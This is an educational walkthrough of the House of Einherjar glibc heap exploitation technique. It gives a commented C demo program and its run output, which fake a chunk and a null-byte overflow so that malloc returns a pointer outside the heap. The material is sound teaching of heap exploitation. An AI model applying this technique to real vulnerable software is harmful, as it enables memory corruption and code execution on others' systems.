# House of Einherjar Explanation

This is a well documented C file that explains how a House of Einherjar attack works. It is based off of: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_einherjar.c

The source Code:

```
#include <stdio.h>
#include <stdlib.h>

// This is based off of: https://github.com/shellphish/how2heap/blob/master/glibc_2.26/house_of_einherjar.c

unsigned long target[6];

int main(void)
{
	puts("So let's cover a House of Einjar attack.");
	puts("The purpose of this attack is to get malloc to return a chunk outside of the heap.");
	puts("We will accomplish this by consolidating the heap up to our fake chunk.");
	puts("We will need to be able to write to the memory we want allocated prior to the allocation.");
	puts("Main benefits of this is all we need to do this attack, is the ability to write to the chunk we want to allocate, groom the heap in a certain way, some infoleaks, and a null byte overflow bug.");
	puts("Let's get started!\n");

	printf("Out goal will be to get malloc to allocate a ptr to:\t%p\n", &target[2]);

	printf("Let's start by setting up our fake chunk.\n");
	printf("For this, there are 6 values we need to set.\n");
	printf("These are the previous size, size, fwd and bk pointers, and the fwd_size and bk_size pointers (think unsorted bin values).\n");
	printf("For the pointers, I just set them all equal to the fake chunk.\n");
	printf("The reason for this is when it performs checks using this pointer, when it points back to this chunk it allows us to pass checks without much hassle.\n");
	printf("We will set the size of this chunk later.\n\n");

	target[2] = (unsigned long)&target;
	target[3] = (unsigned long)&target;
	target[4] = (unsigned long)&target;
	target[5] = (unsigned long)&target;


	printf("Now we will allocate two chunks on the heap, one of size 0x68 and the other 0xf0.\n\n");

	unsigned long *ptr0, *ptr1;
	unsigned long previousSize, size;


	ptr0 = malloc(0x68);
	ptr1 = malloc(0xf0);

	printf("ptr0:\t%p\n", ptr0);
	printf("ptr1:\t%p\n\n", ptr1);

	printf("ptr1 prev size:\t0x%lx\n",ptr1[-2]);
	printf("ptr1 prev size:\t0x%lx\n\n",ptr1[-1]);

	printf("Now we will use the chunk at ptr0 to overflow ptr1. We will use the null byte overflow to overwrite the previous in use bit to zero. Thankfully since the size is 0x%lx, the null byte won't change anything other than that bit.\n", ptr1[-1]);
	printf("This way malloc will think it's previous chunk has been freed, and will attempt to consolidate.\n");
	printf("We will also plant a fake previous chunk size, which will control where it tries to consolidate to.\n");
	printf("We will set this equal to the distance to our target chunk from the start of ptr0 (pointers are to start of the heap metadata, not to the content).\n\n");

	previousSize = (unsigned long)(ptr1 - 2) - (unsigned long)&target;
	size = 0x100;

	printf("Let's plant the fake previous size, and execute the \"simulated\" null byte overflow.\n\n");

	ptr0[12] = previousSize;
	ptr0[13] = size;	

	printf("ptr1 prev size:\t0x%lx\n",ptr1[-2]);
	printf("ptr1 prev size:\t0x%lx\n\n",ptr1[-1]);

	printf("One last thing, there is a check that happens during consolidation where it will check if our fake previous chunk size is equal to the chunk size for the fake chunk we are trying to consolidate to.\n");
	printf("To pass this check, we just need to set the size of our fake chunk equal to the fake previous size value we generated.\n\n");

	target[1] = previousSize;

	printf("With that, we can see our fake chunk here.\n\n");

	printf("Fake Chunk Prev Size:\t0x%lx\n", target[0]);
	printf("Fake Chunk Size:\t0x%lx\n", target[1]);
	printf("Fake Chunk Fwd:\t\t0x%lx\n", target[2]);
	printf("Fake Chunk Bk:\t\t0x%lx\n", target[3]);
	printf("Fake Chunk Fwd_Size:\t0x%lx\n", target[4]);
	printf("Fake Chunk Bk_Size:\t0x%lx\n\n", target[5]);

	printf("With that, we can free ptr1 and consolidate the heap to our fake chunk.\n\n");

	free(ptr1);

	printf("Now let's allocate a chunk and see what we get!\n");
	printf("Allocated Chunk:\t%p\n", malloc(0x10));
}
```

When we run it (this was ran on Ubuntu 16.04):

```
$	./house_einherjar_exp 
So let's cover a House of Einjar attack.
The purpose of this attack is to get malloc to return a chunk outside of the heap.
We will accomplish this by consolidating the heap up to our fake chunk.
We will need to be able to write to the memory we want allocated prior to the allocation.
Main benefits of this is all we need to do this attack, is the ability to write to the chunk we want to allocate, groom the heap in a certain way, some infoleaks, and a null byte overflow bug.
Let's get started!

Out goal will be to get malloc to allocate a ptr to:	0x602090
Let's start by setting up our fake chunk.
For this, there are 6 values we need to set.
These are the previous size, size, fwd and bk pointers, and the fwd_size and bk_size pointers (think unsorted bin values).
For the pointers, I just set them all equal to the fake chunk.
The reason for this is when it performs checks using this pointer, when it points back to this chunk it allows us to pass checks without much hassle.
We will set the size of this chunk later.

Now we will allocate two chunks on the heap, one of size 0x68 and the other 0xf0.

ptr0:	0x708420
ptr1:	0x708490

ptr1 prev size:	0x0
ptr1 prev size:	0x101

Now we will use the chunk at ptr0 to overflow ptr1. We will use the null byte overflow to overwrite the previous in use bit to zero. Thankfully since the size is 0x101, the null byte won't change anything other than that bit.
This way malloc will think it's previous chunk has been freed, and will attempt to consolidate.
We will also plant a fake previous chunk size, which will control where it tries to consolidate to.
We will set this equal to the distance to our target chunk from the start of ptr0 (pointers are to start of the heap metadata, not to the content).

Let's plant the fake previous size, and execute the "simulated" null byte overflow.

ptr1 prev size:	0x106400
ptr1 prev size:	0x100

One last thing, there is a check that happens during consolidation where it will check if our fake previous chunk size is equal to the chunk size for the fake chunk we are trying to consolidate to.
To pass this check, we just need to set the size of our fake chunk equal to the fake previous size value we generated.

With that, we can see our fake chunk here.

Fake Chunk Prev Size:	0x0
Fake Chunk Size:	0x106400
Fake Chunk Fwd:		0x602080
Fake Chunk Bk:		0x602080
Fake Chunk Fwd_Size:	0x602080
Fake Chunk Bk_Size:	0x602080

With that, we can free ptr1 and consolidate the heap to our fake chunk.

Now let's allocate a chunk and see what we get!
Allocated Chunk:	0x602090
```